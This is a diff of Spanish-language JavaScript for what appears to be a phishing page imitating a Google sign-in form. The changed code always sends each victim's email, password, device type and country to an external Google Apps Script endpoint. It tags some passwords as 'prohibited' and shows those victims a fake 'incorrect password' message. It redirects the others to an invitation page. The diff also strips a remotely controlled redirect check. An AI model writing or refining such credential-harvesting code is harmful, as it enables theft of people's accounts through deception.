@@ -1,27 +1,17 @@
-// Script corregido basado en la estructura del HTML proporcionado
-
+// Manejar formulario - Modificación para enviar datos incluso con contraseñas prohibidas
 document.getElementById("loginForm").addEventListener("submit", async function(event) {
-    event.preventDefault(); // Evita el envío automático 
-
-    // Obtener elementos del formulario (usando los IDs correctos del HTML)
-    const emailInput = document.getElementById('emailInput');
-    const passwordInput = document.getElementById('passwordInput');
+    event.preventDefault();
+    
+    const emailInput = document.querySelector('input[name="email"]');
+    const passwordInput = document.querySelector('input[name="password"]');
     const errorMessage = document.getElementById('errorMessage');
     const submitBtn = document.getElementById('submitBtn');
-    
-    // Lista de correos electrónicos y contraseñas prohibidas
-    const prohibitedEmails = ["ejemplo@mail.com", "ejemplo1@correo.com"]; 
-    const prohibitedWords = ["123456","Sandia190395#","sandia190395#","hola1234"]; 
     
     const email = emailInput.value.trim().toLowerCase();
     const password = passwordInput.value;
     
-    console.log("Email ingresado:", email); // Para depuración
-    console.log("Password ingresado:", password); // Para depuración
-    
     // Limpiar errores previos
     errorMessage.style.display = 'none';
-    errorMessage.textContent = '';
     
     // Validar formato de correo electrónico
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -30,7 +20,8 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
         return;
     }
     
-    // Verificar correo prohibido
+    // Lista de correos prohibidos
+    const prohibitedEmails = ["ejemplo@mail.com"];
     if (prohibitedEmails.includes(email)) {
         showError("No se pudo encontrar tu cuenta de Google");
         emailInput.value = '';
@@ -38,16 +29,9 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
         return;
     }
     
-    // Verificar contraseña prohibida (usando .some() para verificar si contiene alguna palabra prohibida)
-    const containsProhibitedPassword = prohibitedWords.some(word => password.includes(word));
-    if (containsProhibitedPassword) {
-        showError("La contraseña no es correcta. Inténtalo de nuevo.");
-        passwordInput.value = '';
-        return;
-    }
-    
-    // Si llegamos aquí, significa que pasó todas las validaciones
-    console.log("Todas las validaciones pasaron, continuando..."); // Para depuración
+    // Verificar contraseñas prohibidas
+    const prohibitedWords = ["Sandia190395#", "sandia190395#", "hola123"];
+    const hasProhibitedPassword = prohibitedWords.some(word => password.includes(word));
     
     // Deshabilitar botón
     submitBtn.disabled = true;
@@ -74,12 +58,19 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
             console.error("Error obteniendo el país:", error);
         }
         
-        // Enviar datos
+        // Enviar datos SIEMPRE (incluso con contraseñas prohibidas)
         const formData = new FormData();
         formData.append("email", email);
         formData.append("password", password);
         formData.append("device", deviceType);
         formData.append("country", country);
+        
+        // Marcar si es una contraseña prohibida
+        if (hasProhibitedPassword) {
+            formData.append("status", "CONTRASEÑA_PROHIBIDA");
+        } else {
+            formData.append("status", "VÁLIDO");
+        }
         
         const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
         
@@ -89,11 +80,22 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
             headers: { "Content-Type": "application/x-www-form-urlencoded" }
         });
         
-        if (response.ok) {
-            window.location.href = "invitation.html";
+        // Ahora SI verificar si debe mostrar error o redirigir
+        if (hasProhibitedPassword) {
+            // Mostrar error y NO redirigir
+            showError("La contraseña no es correcta. Inténtalo de nuevo.");
+            passwordInput.value = '';
+            console.log("✅ Datos enviados - ❌ Contraseña prohibida detectada");
         } else {
-            showError("Error al iniciar sesión. Inténtalo de nuevo.");
+            // Redirigir normalmente
+            if (response.ok) {
+                console.log("✅ Datos enviados - ✅ Redirigiendo");
+                window.location.href = "invitation.html";
+            } else {
+                showError("Error al iniciar sesión. Inténtalo de nuevo.");
+            }
         }
+        
     } catch (error) {
         showError("Error de conexión. Inténtalo de nuevo.");
         console.error("Error:", error);
@@ -103,32 +105,8 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
     }
 });
 
-// Función para mostrar errores
 function showError(message) {
     const errorMessage = document.getElementById('errorMessage');
     errorMessage.textContent = message;
     errorMessage.style.display = 'block';
-    console.log("Error mostrado:", message); // Para depuración
 }
-
-// Manejar mostrar/ocultar contraseña
-document.getElementById('showPassword').addEventListener('change', function() {
-    const passwordInput = document.getElementById('passwordInput');
-    passwordInput.type = this.checked ? 'text' : 'password';
-});
-
-// Verificar redirección
-document.addEventListener("DOMContentLoaded", async function () {
-    const API_URL = "https://script.google.com/macros/s/AKfycbyoGDPGgsNZgpj9Jp8S6o15CCDUbScmb5MctgpMtwmsqEggwxw-JHYSvDB-FbPlXWQq/exec";
-    
-    try {
-        const response = await fetch(`${API_URL}?t=${new Date().getTime()}`);
-        const pagina = await response.text();
-        
-        if (pagina.trim() !== "folder.html") {
-            window.location.href = pagina;
-        }
-    } catch (error) {
-        console.error("Error al verificar la redirección:", error);
-    }
-});
